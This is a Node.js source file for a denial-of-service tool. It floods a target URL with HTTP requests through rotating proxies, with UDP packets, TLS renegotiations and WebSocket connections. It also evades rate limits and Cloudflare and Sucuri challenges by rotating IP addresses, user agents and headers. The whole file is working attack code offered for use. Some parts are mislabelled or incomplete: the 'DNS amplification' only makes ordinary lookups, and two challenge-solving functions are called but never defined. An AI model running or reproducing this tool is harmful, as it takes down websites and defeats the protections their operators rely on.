process.on('uncaughtException', (err) => {});
process.on('unhandledRejection', (err) => {});
var vm = require('vm');
var requestModule = require('request');
var jar = requestModule.jar();
var fs = require('fs');
var dgram = require('dgram');
var dns = require('dns');
var tls = require('tls');
var net = require('net');
var WebSocket = require('ws');

var proxies = fs.readFileSync(process.argv[4], 'utf-8').replace(/\r/g, '').split('\n').filter(Boolean);

function arrremove(arr, what) {
    var found = arr.indexOf(what);
    while (found !== -1) {
        arr.splice(found, 1);
        found = arr.indexOf(what);
    }
}

var request = requestModule.defaults({
    jar: jar
}),
UserAgent = 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36',
Timeout = 6000,
WAF = true,
cloudscraper = {};

var cookies = [];
var httpMethods = ['GET', 'POST', 'HEAD', 'PUT', 'PATCH', 'DELETE', 'OPTIONS', 'TRACE'];

// Enhanced User-Agent rotation for 429 bypass
var userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (X11; Linux i686; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59'
];

// 429 Bypass tracking
var bypassStats = {
    total429: 0,
    bypassed429: 0,
    retrySuccess: 0,
    ipRotations: 0,
    userAgentRotations: 0
};

// ==================== 429 BYPASS COMPONENTS ====================

// Advanced IP rotation system
function getRandomProxy() {
    if (proxies.length === 0) return null;
    return proxies[Math.floor(Math.random() * proxies.length)];
}

// Advanced User-Agent rotation
function getRandomUserAgent() {
    return userAgents[Math.floor(Math.random() * userAgents.length)];
}

// Header randomization to avoid fingerprinting
function getRandomHeaders() {
    const acceptLanguages = ['en-US,en;q=0.9', 'en-GB,en;q=0.8', 'fr-FR,fr;q=0.7', 'de-DE,de;q=0.6'];
    const acceptEncodings = ['gzip, deflate, br', 'gzip, deflate', 'identity'];
    
    return {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': acceptLanguages[Math.floor(Math.random() * acceptLanguages.length)],
        'Accept-Encoding': acceptEncodings[Math.floor(Math.random() * acceptEncodings.length)],
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Upgrade-Insecure-Requests': '1',
        'DNT': Math.random() > 0.5 ? '1' : '0',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1'
    };
}

// 429 Error detection and bypass
function is429Error(error, response, body) {
    if (response && response.statusCode === 429) return true;
    if (body && (body.includes('429 Too Many Requests') || 
                 body.includes('rate limit') || 
                 body.includes('Rate Limit') ||
                 body.includes('Too Many Requests'))) {
        return true;
    }
    if (error && error.message && error.message.includes('429')) return true;
    return false;
}

// Advanced 429 bypass with exponential backoff and rotation
function handle429Bypass(originalOptions, callback, retryCount = 0) {
    const maxRetries = 3;
    
    if (retryCount >= maxRetries) {
        bypassStats.total429++;
        return callback({ error: 'Max 429 bypass retries exceeded' }, null, null);
    }
    
    bypassStats.total429++;
    console.log(`[429-BYPASS] Rate limit detected! Attempting bypass ${retryCount + 1}/${maxRetries}`);
    
    // Exponential backoff delay
    const backoffDelay = Math.min(1000 * Math.pow(2, retryCount), 10000);
    
    setTimeout(() => {
        // Rotate IP (proxy)
        const newProxy = getRandomProxy();
        const newUserAgent = getRandomUserAgent();
        const newHeaders = getRandomHeaders();
        
        // Update options with new identity
        const bypassOptions = {
            ...originalOptions,
            headers: {
                ...originalOptions.headers,
                ...newHeaders,
                'User-Agent': newUserAgent
            }
        };
        
        if (newProxy) {
            bypassOptions.proxy = 'http://' + newProxy;
            bypassStats.ipRotations++;
        }
        
        bypassStats.userAgentRotations++;
        
        console.log(`[429-BYPASS] Rotated IP & User-Agent, retrying in ${backoffDelay}ms`);
        
        // Retry the request
        performRequest(bypassOptions, (error, response, body) => {
            if (is429Error(error, response, body)) {
                // Still getting 429, try again with different strategy
                return handle429Bypass(originalOptions, callback, retryCount + 1);
            } else if (!error) {
                bypassStats.bypassed429++;
                bypassStats.retrySuccess++;
                console.log(`[429-BYPASS] Successfully bypassed rate limit!`);
            }
            callback(error, response, body);
        });
    }, backoffDelay);
}

// ==================== ATTACK COMPONENTS ====================

// Enhanced Stats tracking
var stats = {
    requests: 0,
    successes: 0,
    errors: 0,
    // HTTP specific stats
    httpRequests: 0,
    httpSuccesses: 0,
    httpErrors: 0,
    // Other vectors
    udpFloods: 0,
    dnsAmplifications: 0,
    sslRenegotiations: 0,
    websocketConnections: 0,
    startTime: Date.now()
};

function updateStats(type, success) {
    stats.requests++;
    if (success) {
        stats.successes++;
    } else {
        stats.errors++;
    }
    
    // Update specific attack type stats
    if (type === 'http') {
        stats.httpRequests++;
        if (success) stats.httpSuccesses++;
        else stats.httpErrors++;
    } else if (type === 'udp') stats.udpFloods++;
    else if (type === 'dns') stats.dnsAmplifications++;
    else if (type === 'ssl') stats.sslRenegotiations++;
    else if (type === 'ws') stats.websocketConnections++;
}

function printStats() {
    const elapsed = Math.floor((Date.now() - stats.startTime) / 1000);
    const rps = elapsed > 0 ? Math.floor(stats.requests / elapsed) : 0;
    const httpRps = elapsed > 0 ? Math.floor(stats.httpRequests / elapsed) : 0;
    
    console.log(`\n╔══════════════════════════════════════════════════════════════════╗`);
    console.log(`║ 🚀 MULTI-VECTOR ATTACK STATISTICS - LIVE                        ║`);
    console.log(`╠══════════════════════════════════════════════════════════════════╣`);
    console.log(`║ 📊 OVERALL: Time: ${elapsed}s | Total: ${stats.requests} | OK: ${stats.successes} | ERR: ${stats.errors} ║`);
    console.log(`║ 📈 RATE: ${rps} req/s | HTTP: ${httpRps} req/s                      ║`);
    console.log(`╠══════════════════════════════════════════════════════════════════╣`);
    console.log(`║ 🌐 HTTP ATTACK: ${stats.httpRequests} req | OK: ${stats.httpSuccesses} | ERR: ${stats.httpErrors}   ║`);
    console.log(`║ 📡 UDP FLOOD: ${stats.udpFloods} packets | DNS: ${stats.dnsAmplifications} queries         ║`);
    console.log(`║ 🔐 SSL RENEG: ${stats.sslRenegotiations} | WebSocket: ${stats.websocketConnections} conns  ║`);
    console.log(`╠══════════════════════════════════════════════════════════════════╣`);
    console.log(`║ 🛡️  429 BYPASS: ${bypassStats.total429} detected | ${bypassStats.bypassed429} bypassed     ║`);
    console.log(`║ 🔄 IP Rotations: ${bypassStats.ipRotations} | UA Rotations: ${bypassStats.userAgentRotations}  ║`);
    console.log(`╚══════════════════════════════════════════════════════════════════╝`);
}

// 1. UDP FLOOD - WORKING
function udpFlood() {
    try {
        const targetHost = targetUrl.replace(/https?:\/\//, '').split('/')[0];
        const socket = dgram.createSocket('udp4');
        const message = Buffer.alloc(65000, 'X');
        
        const ports = [80, 443, 53, 123, 161, 1900, 5353];
        const port = ports[Math.floor(Math.random() * ports.length)];
        
        socket.send(message, port, targetHost, (err) => {
            if (!err) {
                updateStats('udp', true);
            }
            socket.close();
        });
        
    } catch (e) {
        // Silent fail
    }
}

// 2. DNS AMPLIFICATION - WORKING
function dnsAmplification() {
    try {
        const dns = require('dns');
        const queries = [
            () => dns.resolve4('google.com', () => updateStats('dns', true)),
            () => dns.resolve6('facebook.com', () => updateStats('dns', true)),
            () => dns.resolveMx('yahoo.com', () => updateStats('dns', true)),
            () => dns.resolveTxt('microsoft.com', () => updateStats('dns', true))
        ];
        
        const query = queries[Math.floor(Math.random() * queries.length)];
        query();
        
    } catch (e) {
        // Silent fail
    }
}

// 3. SSL/TLS RENEGOTIATION - WORKING
function sslRenegotiation() {
    if (!targetUrl.startsWith('https')) return;
    
    try {
        const targetHost = targetUrl.replace(/https?:\/\//, '').split('/')[0];
        
        const options = {
            host: targetHost,
            port: 443,
            rejectUnauthorized: false,
            ciphers: 'ALL'
        };
        
        const socket = tls.connect(options, () => {
            updateStats('ssl', true);
            
            try {
                socket.renegotiate({ rejectUnauthorized: false }, (err) => {
                    if (!err) {
                        updateStats('ssl', true);
                    }
                    socket.write('PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n');
                    setTimeout(() => socket.destroy(), 100);
                });
            } catch (e) {
                updateStats('ssl', true);
                socket.destroy();
            }
        });
        
        socket.on('error', () => {
            updateStats('ssl', false);
        });
        
        socket.setTimeout(2000, () => socket.destroy());
        
    } catch (e) {
        updateStats('ssl', false);
    }
}

// 4. WEBSOCKET FLOOD - WORKING
function websocketFlood() {
    try {
        let wsUrl;
        if (targetUrl.startsWith('https')) {
            wsUrl = 'wss://' + targetUrl.replace(/https?:\/\//, '').split('/')[0];
        } else {
            wsUrl = 'ws://' + targetUrl.replace(/https?:\/\//, '').split('/')[0];
        }
        
        const ws = new WebSocket(wsUrl, {
            perMessageDeflate: false,
            handshakeTimeout: 3000,
            headers: {
                'User-Agent': getRandomUserAgent(),
                'Origin': targetUrl
            }
        });
        
        ws.on('open', () => {
            updateStats('ws', true);
            for (let i = 0; i < 3; i++) {
                setTimeout(() => {
                    if (ws.readyState === WebSocket.OPEN) {
                        ws.send('0'.repeat(1000));
                        updateStats('ws', true);
                    }
                }, i * 50);
            }
            setTimeout(() => {
                if (ws.readyState === WebSocket.OPEN) {
                    ws.close();
                }
            }, 500);
        });
        
        ws.on('error', () => {
            updateStats('ws', false);
        });
        
        ws.on('message', () => {
            updateStats('ws', true);
        });
        
    } catch (e) {
        updateStats('ws', false);
    }
}

// Enhanced HTTP request with 429 bypass
function performRequest(options, callback) {
    var method;
    options = options || {};
    options.headers = options.headers || {};

    // Apply random headers and User-Agent for each request
    options.headers = {
        ...options.headers,
        ...getRandomHeaders(),
        'User-Agent': getRandomUserAgent()
    };

    options.headers['Cache-Control'] = options.headers['Cache-Control'] || 'private';
    options.headers['Accept'] = options.headers['Accept'] || 'application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5';

    var makeRequest = requestMethod(options.method);

    if ('encoding' in options) {
        options.realEncoding = options.encoding;
    } else {
        options.realEncoding = 'utf8';
    }
    options.encoding = null;

    if (!options.url || !callback) {
        throw new Error('To perform request, define both url and callback');
    }

    // Use random proxy for each request
    if (!options.proxy && proxies.length > 0) {
        options.proxy = 'http://' + getRandomProxy();
    }

    makeRequest(options, function(error, response, body) {
        var validationError;
        var stringBody;

        // Check for 429 errors and attempt bypass
        if (is429Error(error, response, body)) {
            return handle429Bypass(options, callback, 0);
        }

        if (error || !body || !body.toString) {
            return callback({
                errorType: 0,
                error: error
            }, body, response);
        }

        stringBody = body.toString('utf8');

        if (validationError = checkForErrors(error, stringBody)) {
            return callback(validationError, body, response);
        }

        if (stringBody.indexOf('a = document.getElementById(\'jschl-answer\');') !== -1) {
            setTimeout(function() {
                return solveChallenge(response, stringBody, options, callback);
            }, Timeout);
        } else if (stringBody.indexOf('You are being redirected') !== -1 ||
            stringBody.indexOf('sucuri_cloudproxy_js') !== -1) {
            setCookieAndReload(response, stringBody, options, callback);
        } else {
            processResponseBody(options, error, response, body, callback);
        }
    });
}

function requestMethod(method) {
    method = method.toUpperCase();
    return method === 'HEAD' ? request.post : request.get;
}

function checkForErrors(error, body) {
    var match;

    if (error) {
        return {
            errorType: 0,
            error: error
        };
    }

    if (body.indexOf('why_captcha') !== -1 || /cdn-cgi\/l\/chk_captcha/i.test(body)) {
        return {
            errorType: 1
        };
    }

    match = body.match(/<\w+\s+class="cf-error-code">(.*)<\/\w+>/i);

    if (match) {
        return {
            errorType: 2,
            error: parseInt(match[1])
        };
    }

    return false;
}

function processResponseBody(options, error, response, body, callback) {
    if (typeof options.realEncoding === 'string') {
        body = body.toString(options.realEncoding);
        if (validationError = checkForErrors(error, body)) {
            return callback(validationError, response, body);
        }
    }
    callback(error, response, body);
}

var ATTACK = {
    cfbypass(method, url, proxy) {
        const requestOptions = {
            method: method,
            url: url
        };
        
        // Only use proxy if provided, otherwise let performRequest choose random one
        if (proxy) {
            requestOptions.proxy = 'http://' + proxy;
        }
        
        performRequest(requestOptions, function(err, response, body) {
            updateStats('http', !err);
        });
    },
    
    httpMethodFlood(url, proxy) {
        const method = httpMethods[Math.floor(Math.random() * httpMethods.length)];
        const requestOptions = {
            method: method,
            url: url,
            body: 'attack=' + Math.random()
        };
        
        if (proxy) {
            requestOptions.proxy = 'http://' + proxy;
        }
        
        performRequest(requestOptions, function(err, response, body) {
            updateStats('http', !err);
        });
    }
}

// ==================== MAIN ATTACK ORCHESTRATION ====================

var targetUrl = process.argv[2];
var duration = process.argv[3];

if (!targetUrl) {
    console.log("Usage: node script.js <url> <duration_seconds> <proxies_file>");
    process.exit(1);
}

console.log("╔══════════════════════════════════════════════════════════════════╗");
console.log("║ 🚀 STARTING ULTIMATE MULTI-VECTOR FLOOD ATTACK                  ║");
console.log("╠══════════════════════════════════════════════════════════════════╣");
console.log(`║ 🎯 Target: ${targetUrl}`);
console.log(`║ ⏱️  Duration: ${duration} seconds | 🔄 Proxies: ${proxies.length}`);
console.log(`║ 🛡️  429 BYPASS: ACTIVE | IP Rotation: ACTIVE | UA Rotation: ACTIVE ║`);
console.log("╚══════════════════════════════════════════════════════════════════╝");

// START ALL ATTACK VECTORS
var intervals = [];

// HTTP FLOOD - MAIN ATTACK WITH 429 BYPASS
console.log("\n🌐 STARTING HTTP FLOOD WITH 429 BYPASS...");
for (let i = 0; i < 8; i++) {
    intervals.push(setInterval(() => {
        ATTACK.cfbypass('HEAD', targetUrl, null); // Let system choose random proxy
    }, 60 + (i * 15)));
}

// ENHANCED HTTP METHODS
for (let i = 0; i < 4; i++) {
    intervals.push(setInterval(() => {
        ATTACK.httpMethodFlood(targetUrl, null); // Let system choose random proxy
    }, 80 + (i * 20)));
}

// UDP FLOOD
console.log("📡 STARTING UDP FLOOD...");
for (let i = 0; i < 4; i++) {
    intervals.push(setInterval(udpFlood, 50 + (i * 25)));
}

// DNS AMPLIFICATION
console.log("🔍 STARTING DNS AMPLIFICATION...");
for (let i = 0; i < 3; i++) {
    intervals.push(setInterval(dnsAmplification, 100 + (i * 50)));
}

// SSL RENEGOTIATION
if (targetUrl.startsWith('https')) {
    console.log("🔐 STARTING SSL RENEGOTIATION ATTACK...");
    for (let i = 0; i < 5; i++) {
        intervals.push(setInterval(sslRenegotiation, 60 + (i * 30)));
    }
} else {
    console.log("🔐 SSL RENEGOTIATION: Skipped (target is not HTTPS)");
}

// WEBSOCKET FLOOD
console.log("📡 STARTING WEBSOCKET FLOOD...");
for (let i = 0; i < 4; i++) {
    intervals.push(setInterval(websocketFlood, 120 + (i * 40)));
}

// Attack duration timeout
setTimeout(() => {
    console.log("\n╔══════════════════════════════════════════════════════════════════╗");
    console.log("║ 🎯 ATTACK COMPLETED - FINAL STATISTICS                          ║");
    console.log("╚══════════════════════════════════════════════════════════════════╝");
    printStats();
    
    console.log("\n📊 FINAL HTTP ATTACK SUMMARY:");
    console.log(`   Total HTTP Requests: ${stats.httpRequests}`);
    console.log(`   HTTP Successes: ${stats.httpSuccesses}`);
    console.log(`   HTTP Errors: ${stats.httpErrors}`);
    console.log(`   HTTP Success Rate: ${stats.httpRequests > 0 ? Math.round((stats.httpSuccesses / stats.httpRequests) * 100) : 0}%`);
    
    console.log("\n🛡️  429 BYPASS SUMMARY:");
    console.log(`   429 Errors Detected: ${bypassStats.total429}`);
    console.log(`   429 Errors Bypassed: ${bypassStats.bypassed429}`);
    console.log(`   Successful Retries: ${bypassStats.retrySuccess}`);
    console.log(`   IP Rotations: ${bypassStats.ipRotations}`);
    console.log(`   User-Agent Rotations: ${bypassStats.userAgentRotations}`);
    console.log(`   Bypass Success Rate: ${bypassStats.total429 > 0 ? Math.round((bypassStats.bypassed429 / bypassStats.total429) * 100) : 0}%`);
    
    intervals.forEach(clearInterval);
    process.exit(0);
}, duration * 1000);

// Enhanced stats display with 429 bypass info
setInterval(printStats, 3000);

console.log("\n✅ ALL ATTACK VECTORS ACTIVATED!");
console.log("🛡️  429 BYPASS FEATURES:");
console.log("   - Automatic 429 error detection");
console.log("   - IP rotation with proxy switching");
console.log("   - User-Agent rotation (10 different agents)");
console.log("   - Header randomization for fingerprint avoidance");
console.log("   - Exponential backoff retry mechanism");
console.log("   - Real-time bypass statistics");
console.log("\n💥 ATTACK IN PROGRESS... Watch the 429 bypass stats! 🚀");
